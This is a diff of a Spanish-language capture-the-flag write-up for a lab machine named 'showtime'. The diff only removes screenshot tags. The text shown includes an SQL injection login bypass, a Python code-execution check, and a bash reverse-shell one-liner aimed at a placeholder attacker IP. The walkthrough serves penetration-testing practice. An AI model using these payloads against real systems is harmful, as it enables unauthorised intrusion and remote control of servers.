@@ -115,11 +115,9 @@ Service detection performed. Please report any incorrect results at https://nmap
                     <br><br>
                     Parece que la web tiene temática de casino. En la esquina superior derecha veo un botón que dice <i>login</i>, cuando lo presiono me dirige a un panel de login.
                 </p>
-                <img src="https://n4g1h4ck.github.io/images/DL/showtime/showtime2.png" alt="showtime web">
                 <p class="description">
                     Intenté un <i>SQL Injection</i> sencillo (<code class="language-sql">test' or 1=1-- -</code>) y funcionó!.
                 </p>
-                <img src="https://n4g1h4ck.github.io/images/DL/showtime/showtime3.png" alt="showtime web">
                 <p class="description">
                     Al ver que el login es vulnerable a una inyección sql, trataré de probar una <i>inyección SQL ciega basada en tiempo</i>. Puedes utilizar <span class="highlight">SQLMap</span> para esta parte, sin embargo yo prefiero los métodos manuales así que hare unos <i>scripts en python</i> para que me automatice la explotación de la vulnerabilidad. En mis <a target="_blank" href="https://n4g1h4ck.github.io/tools.html" class="highlight">Herramientas</a> estarán los scripts explicados para los que quieran utilizarlos.
                 </p>
@@ -140,14 +138,12 @@ Service detection performed. Please report any incorrect results at https://nmap
                 <p class="description">
                     Si pruebo las credenciales en el login, veo que al usuario <i class="highlight">joe</i> lo redirige a <i class="highlight">http://172.17.0.2/login_page/admin-panel.php</i>.
                 </p>
-                <img src="https://n4g1h4ck.github.io/images/DL/showtime/showtime4.png" alt="showtime web">
                 <p class="description">
                     Veo que hay un formulario que interpreta código python, si escribo <code class="language-python">print('hola')</code> me muestra el output. Lo siguiente que haré es verificar si puedo ejecutar comandos con el módulo <i class="highlight">os</i> con este código:
                 </p>
                 <pre class="code"><code class="language-python">import os
 os.system('whoami')</code></pre>
                 <br><br>
-                <img src="https://n4g1h4ck.github.io/images/DL/showtime/showtime4.png" alt="showtime web">
                 <p class="description">Observo que tengo capacidad de ejecutar comandos, así que voy a utilizar un <i>oneliner en bash</i> para obtener una conexión por tcp hacia mi máquina atacante</p>
                 <pre class="code"><code class="language-python">import os
 os.system('bash -c "bash -i >& /dev/tcp/IP_DE_LA_MAQUINA_ATACANTE/PUERTO_LOCAL 0>&1"')</code></pre>
